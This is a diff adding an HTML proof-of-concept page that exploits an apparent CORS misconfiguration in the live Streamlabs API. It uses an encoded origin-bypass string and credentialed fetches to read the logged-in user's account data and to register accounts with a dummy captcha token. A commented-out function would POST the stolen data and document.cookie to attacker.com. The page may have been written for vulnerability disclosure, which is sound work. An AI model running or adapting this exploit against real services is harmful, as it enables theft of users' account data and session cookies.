@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS PoC - Streamlabs</title>
+    <meta charset="UTF-8">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 50px auto;
+            padding: 20px;
+            background: #f0f0f0;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        button {
+            background: #4CAF50;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            margin: 10px 5px;
+        }
+        button:hover {
+            background: #45a049;
+        }
+        #output {
+            margin-top: 20px;
+            padding: 15px;
+            background: #f9f9f9;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+        .error {
+            color: #d32f2f;
+        }
+        .success {
+            color: #388e3c;
+        }
+        .info {
+            color: #1976d2;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>CORS Vulnerability PoC - Streamlabs API</h1>
+        <p class="info">Origin: https://mon3m.me%25%32%33@media.streamlabs.com</p>
+        
+        <button onclick="testCORS()">Test CORS Vulnerability</button>
+        <button onclick="getUserInfo()">Get User Info</button>
+        <button onclick="registerUser()">Register New User</button>
+        <button onclick="clearOutput()">Clear Output</button>
+        
+        <div id="output"></div>
+    </div>
+
+    <script>
+        // Helper function to display output
+        function log(message, type = 'info') {
+            const output = document.getElementById('output');
+            const timestamp = new Date().toLocaleTimeString();
+            const className = type;
+            output.innerHTML += `<span class="${className}">[${timestamp}] ${message}</span>\n`;
+            output.scrollTop = output.scrollHeight;
+        }
+
+        // Clear output
+        function clearOutput() {
+            document.getElementById('output').innerHTML = '';
+        }
+
+        // Test basic CORS
+        async function testCORS() {
+            log('Testing CORS configuration...', 'info');
+            
+            try {
+                const response = await fetch('https://api-id.streamlabs.com/v1/auth/register', {
+                    method: 'OPTIONS',
+                    credentials: 'include',
+                    headers: {
+                        'Origin': 'https://mon3m.me%25%32%33@media.streamlabs.com'
+                    }
+                });
+                
+                log('Response Headers:', 'info');
+                response.headers.forEach((value, key) => {
+                    if (key.toLowerCase().includes('access-control')) {
+                        log(`${key}: ${value}`, 'success');
+                    }
+                });
+                
+                if (response.headers.get('Access-Control-Allow-Credentials') === 'true') {
+                    log('⚠️ CORS Misconfiguration Confirmed! Credentials are allowed!', 'error');
+                }
+                
+            } catch (error) {
+                log(`Error: ${error.message}`, 'error');
+            }
+        }
+
+        // Get user info
+        async function getUserInfo() {
+            log('Attempting to get user info...', 'info');
+            
+            try {
+                const response = await fetch('https://api-id.streamlabs.com/v1/user', {
+                    method: 'GET',
+                    credentials: 'include',
+                    headers: {
+                        'Accept': 'application/json',
+                        'Client-Id': '419049641753968640'
+                    }
+                });
+                
+                const data = await response.json();
+                log('User Info Retrieved:', 'success');
+                log(JSON.stringify(data, null, 2), 'success');
+                
+                // Send to attacker server (commented for safety)
+                // await sendToAttacker(data);
+                
+            } catch (error) {
+                log(`Failed to get user info: ${error.message}`, 'error');
+            }
+        }
+
+        // Register new user
+        async function registerUser() {
+            log('Attempting to register new user...', 'info');
+            
+            const randomEmail = `test${Date.now()}@example.com`;
+            const payload = {
+                email: randomEmail,
+                username: "",
+                password: "TestPassword123!",
+                agree: true,
+                agreePromotional: false,
+                dob: "",
+                captcha_token: "dummy_token",
+                locale: "en-US"
+            };
+            
+            try {
+                const response = await fetch('https://api-id.streamlabs.com/v1/auth/register', {
+                    method: 'POST',
+                    credentials: 'include',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json',
+                        'Client-Id': '419049641753968640'
+                    },
+                    body: JSON.stringify(payload)
+                });
+                
+                const data = await response.json();
+                
+                if (response.ok) {
+                    log('Registration Successful!', 'success');
+                    log(JSON.stringify(data, null, 2), 'success');
+                    
+                    // Check for access token in cookies
+                    if (document.cookie.includes('access_token')) {
+                        log('⚠️ Access token found in cookies!', 'error');
+                    }
+                } else {
+                    log('Registration failed:', 'error');
+                    log(JSON.stringify(data, null, 2), 'error');
+                }
+                
+            } catch (error) {
+                log(`Registration error: ${error.message}`, 'error');
+            }
+        }
+
+        // Simulate sending data to attacker server
+        async function sendToAttacker(data) {
+            log('Simulating data exfiltration...', 'info');
+            log(`Would send to attacker: ${JSON.stringify(data)}`, 'error');
+            
+            // Actual exfiltration (commented for safety):
+            /*
+            await fetch('https://attacker.com/steal', {
+                method: 'POST',
+                body: JSON.stringify({
+                    victim_data: data,
+                    cookies: document.cookie,
+                    timestamp: new Date().toISOString()
+                })
+            });
+            */
+        }
+
+        // Auto-test on load
+        window.onload = function() {
+            log('CORS PoC Loaded Successfully', 'success');
+            log('Click buttons to test different attack scenarios', 'info');
+            
+            // Display current origin
+            log(`Current page origin: ${window.location.origin}`, 'info');
+            log(`Target origin bypass: https://mon3m.me%25%32%33@media.streamlabs.com`, 'info');
+        };
+    </script>
+</body>
+</html>
